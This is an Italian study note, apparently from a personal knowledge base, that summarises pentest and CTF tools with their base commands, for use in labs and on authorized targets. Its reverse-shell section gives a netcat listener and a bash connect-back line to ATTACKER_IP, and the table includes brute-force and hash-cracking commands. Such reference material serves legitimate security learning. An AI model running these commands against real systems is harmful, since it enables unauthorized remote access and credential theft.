---
tipo: sintesi
tag: [metodologia, tool, sintesi]
fase: 0
aggiornato: 2026-06-25
stato: attivo
aliases: ["Arsenale Tool", "Arsenale Tool — Pentest / CTF"]
---

# Arsenale Tool — Pentest / CTF

Riferimento rapido ai tool essenziali: **categoria → uso → comando base**. Contesto etico (CTF, lab, target autorizzati). Ogni tool rimanda ai concept dove serve.

## Tabella tool
| Tool | Categoria | Uso principale | Comando base |
|---|---|---|---|
| **nmap** | Recon / scanning | Scoperta host, porte, servizi, OS | `nmap -sC -sV -oA out 10.0.0.5` |
| **gobuster** | Web enum | Brute-force directory/DNS/vhost | `gobuster dir -u http://t -w wordlist.txt` |
| **nikto** | Web scanner | Misconfig, file noti, header | `nikto -h http://target` |
| **sqlmap** | Web / injection | Rileva e sfrutta SQLi automatic. | `sqlmap -u "http://t?id=1" --dbs` |
| **burpsuite** | Web proxy | Intercept, repeater, intruder | GUI; proxy su `127.0.0.1:8080` |
| **wireshark** | Network analysis | Cattura/analisi pacchetti (GUI) | filtro `http && ip.addr==x` |
| **tcpdump** | Network analysis | Cattura pacchetti CLI | `tcpdump -i eth0 -w cap.pcap` |
| **metasploit** | Exploitation | Framework exploit/payload/post | `msfconsole`; `use exploit/...` |
| **netcat** | Networking | Connessioni TCP/UDP, reverse shell | `nc -lvnp 4444` (listener) |
| **socat** | Networking | Relay/tunnel, shell stabili (pty) | `socat TCP-L:4444 -` |
| **hashcat** | Password cracking | Crack hash GPU, regole | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
| **john** | Password cracking | Crack hash CPU, formati vari | `john --wordlist=rockyou.txt hash.txt` |
| **hydra** | Brute force | Login online (http/ssh/ftp...) | `hydra -L u -P p ssh://t` |
| **ghidra** | Reverse engineering | Disassembler/decompiler (NSA) | GUI; import binario → decompile |
| **radare2** | Reverse engineering | RE/debug CLI | `r2 -A ./binary` ; `pdf @main` |

## Note d'uso per fase (mappa al [[Penetration Testing]])
- **Recon/Scan**: nmap → gobuster/nikto (web) → wireshark/tcpdump (rete).
- **Exploit**: sqlmap, burp (web) · metasploit (servizi) · hydra (auth).
- **Post-exploitation**: netcat/socat (shell), [[Privilege Escalation]] (linpeas/GTFOBins).
- **Crypto/forensics/RE (CTF)**: hashcat/john ([[Cryptographic Failures]]) · ghidra/radare2 ([[Metodologia CTF]]).

## Reverse shell — pattern base (netcat)
```bash
# Attaccante (listener)
nc -lvnp 4444
# Vittima (connect-back)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# Stabilizzare la shell
python3 -c 'import pty;pty.spawn("/bin/bash")'   # poi: socat per pieno pty
```

## Burp Suite — workflow minimo
1. Proxy → intercetta richiesta. 2. Invia a **Repeater** per manipolare a mano. 3. **Intruder** per fuzzing/brute (payload positions). 4. **Collaborator** per blind/out-of-band ([[SSRF]]). Dettagli in [[Web Hacking]].

## Collegamenti
- Vedi anche: [[Matrice Attacco-Difesa]], [[Roadmap di Apprendimento]], [[Penetration Testing]], [[Metodologia CTF]], [[Web Hacking]], [[Privilege Escalation]]
- Reti: [[TCP]], [[DNS]] · Linux: [[SSH]], [[Permessi dei File]]

## Fonti
- [PortSwigger Web Security Academy — <https://portswigger.net/web-security>]
- [Nmap Reference Guide — <https://nmap.org/book/>]
